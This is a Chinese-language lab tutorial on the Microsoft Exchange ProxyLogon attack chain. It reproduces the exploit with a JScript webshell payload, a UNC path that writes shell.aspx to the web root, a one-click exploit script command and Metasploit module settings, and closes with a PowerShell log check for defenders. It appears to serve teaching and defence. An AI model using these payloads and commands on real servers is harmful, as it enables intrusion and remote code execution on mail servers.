## 漏洞背景

2021年3月2日，微软发布了Exchange服务器的紧急安全更新，修复了如下7个相关的漏洞。

  * Exchange服务端请求伪造漏洞（CVE-2021-26855):未经身份验证的攻击者能够构造HTTP请求扫描内网并通过Exchange服务器进行身份验证。

  * Exchange反序列化漏洞（CVE-2021-26857):具有管理员权限的攻击者可以在Exchange服务器上以System身份运行任意代码。

  * Exchange任意文件写入漏洞（CVE-2021-26858、CVE-2021-27065):经过身份验证的攻击者可以利用漏洞将文件写入服务器的任意目录中，可结合CVE-2021-26855SSRF漏洞进行组合攻击，导致攻击者可未经身份验证获取服务器System权限。

  * Exchange远程代码执行漏洞（CVE-2021-26412、CVE-2021-26854、CVE-2021-27078）。

本节介绍Exchange任意文件写入漏洞与Exchange服务端请求伪造漏洞结合进行组合攻击。该组合攻击链被称为Exchange ProxyLogon
攻击利用链。

## 漏洞原理

我们来看看Exchange任意文件写入漏洞是如何产生的。

该任意文件写入的漏洞的具体位置是在Exchange后台管理中心，也就是localhost/ecp路径下的服务器的虚拟目录处，如图所示，该页面需要域管理员的权限才可以访问。

![图片.png](https://image.3001.net/images/20230604/1685871541_647c5bb5157ae6c825024.png!small)

然后选中虚拟目录下的OAB（Default Web
Site）选项，单击上方的修改按钮![图片.png](https://image.3001.net/images/20230604/1685871565_647c5bcd11564e401ab84.png!small)，如图所示：

![图片.png](https://image.3001.net/images/20230604/1685871586_647c5be20968ec764e0c5.png!small)

弹出虚拟目录配置窗口，在内部URL和外部的URL中都可以输入payload，且输入的payload必须以http或https开头。内部的URL和外部的URL都限制了输入的最大长度为255，并且会将输入的URL中的%全部编码为%25。

这里选择修改外部的URL，因为修改内部的URL可能会让内部某些服务失去作用，外部的URL中填入如下payload：

    
    
    http://ffff/#<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],"unsafe");}</script>
    

如图所示，在外部的URL中输入payload，单击“保存”按钮。

![图片.png](https://image.3001.net/images/20230604/1685871607_647c5bf79a3ac0a6d24c2.png!small)

保存后，点击选择OAB，点击如下的图标

![图片.png](https://image.3001.net/images/20230604/1685871625_647c5c09b5cb5bd2ee00c.png!small)

这样会弹出一个重置虚拟目录的输入框

![图片.png](https://image.3001.net/images/20230604/1685871641_647c5c1955d917925ec5f.png!small)

因为Exchange服务器并没有对输入框中内路径和保存的文件名进行检测和限制，所以可以在此输入框中填入任意的的路径和文件名，造成任意文件写入漏洞。这里的输入框中填入如下的路径，然后单击“重置”按钮，等待保存即可。

    
    
    \\127.0.0.1\C$\inetpub\wwwroot\aspnet_client\shell.aspx
    

![图片.png](https://image.3001.net/images/20230604/1685871659_647c5c2b516e9dcea4003.png!small)

![图片.png](https://image.3001.net/images/20230604/1685871669_647c5c3520c6b0e49f146.png!small)

保存完成后，就可以在Exchange服务器的C:\inetpub\wwwroot\aspnet_client路径下找到刚刚写入的shell.aspx木马文件，如图所示：

![图片.png](https://image.3001.net/images/20230604/1685871683_647c5c43e0384460ef120.png!small)

shell.aspx木马文件内容如图所示：

![图片.png](https://image.3001.net/images/20230604/1685871701_647c5c55cf54a98482e91.png!small)

随后我们浏览器输入如下的路径便可以访问该Webshell

    
    
    https://localhost/aspnet_client/shell.aspx
    

![图片.png](https://image.3001.net/images/20230604/1685871717_647c5c65b384b73f81e7c.png!small)

如下图，我们使用BP开启拦截，可以看到成功访问到该Webshell

![图片.png](https://image.3001.net/images/20230604/1685871732_647c5c745bc488023d961.png!small)

除了OAB外，其他服务如PowerShell、ECP、EWS、OWA都可以设置内部URL和外部URL，同时也可以进行重置操作。

## 漏洞影响版本

  * Exchange Server 2013

  * Exchange Server 2016

  * Exchange Server 2019

## 漏洞复现

实验环境如下：

  * Exchange邮箱服务器：192.168.41.50

  * 存在的邮箱用户：hack@hack.com

### 一键化脚本攻击

脚本下载地址：`https://github.com/hausec/ProxyLogon`

这里使用一键化攻击脚本proxylogon.py执行如下的命令，复现演示，其中hack@hack.com是存在的用户邮箱名。

    
    
    python2 proxylogon.py 192.168.41.50 'hack'@hack.com
    
    

![图片.png](https://image.3001.net/images/20230604/1685871750_647c5c86de980b88bbb05.png!small)

如图所示，我们成功获得了System权限

### MSF检测和攻击

在MSF中已经集成了如下检测和利用ProxyLogon的模块，如图所示：

    
    
    #扫描目标exchange服务器是否存在proxylogon漏洞
    auxiliary/scanner/http/exchange_proxylogon
    #对proxylogon漏洞进行rce利用
    exploit/windows/http/exchange_proxylogon_rce
    

![图片.png](https://image.3001.net/images/20230604/1685871767_647c5c975c1960be5f318.png!small)

#### 漏洞检测模块的使用

如下是漏洞检测模块的使用，只需要设置目标Exchange邮箱服务器的地址即可。

    
    
    use auxiliary/scanner/http/exchange_proxylogon
    set rhosts 192.168.41.50
    run
    

如图所示，可以看出成功扫描到目标Exchange邮箱服务器存在ProxyLogon漏洞。

![图片.png](https://image.3001.net/images/20230604/1685871782_647c5ca6b62d4b41f195b.png!small)

#### 漏洞利用模块的使用

如下是漏洞利用模块的使用，设置相应的payload、目标Exchange邮箱服务器的地址、有效的邮箱用户、监听IP即可。

    
    
    use exploit/windows/http/exchange_proxylogon_rce
    set payload windows/x64/meterpreter/bind_tcp
    set rhosts 192.168.41.50
    set email hack@hack.com
    run
    

![图片.png](https://image.3001.net/images/20230604/1685871799_647c5cb7522faa15bb0ff.png!small)

如图所示，对模块中各值进行设置，并成功进行了攻击，成功完成攻击之后，会返回给攻击者一个Session 会话。

## 漏洞检测和防御

对于防守方和蓝队来说，如何针对ProxyLogon攻击链进行检测和防御呢？

攻击者的攻击痕迹会留在以下路径的日志中，日志文件如图所示：

    
    
    %PROGRAMFILES%\Microsoft\Exchange Server\V15\Logging\ECP\Server\
    

![图片.png](https://image.3001.net/images/20230604/1685871813_647c5cc5d2029bdf3a913.png!small)

防守方可据此在Exchange服务器上执行如下的Powershell语句，检测攻击痕迹。

    
    
    Select-String -Path "$env:PROGRAMFILES\Microsoft\Exchange Server\V15\Logging\ECP\Server\*.log" -Pattern 'Set-.+VirtualDirectory'
    

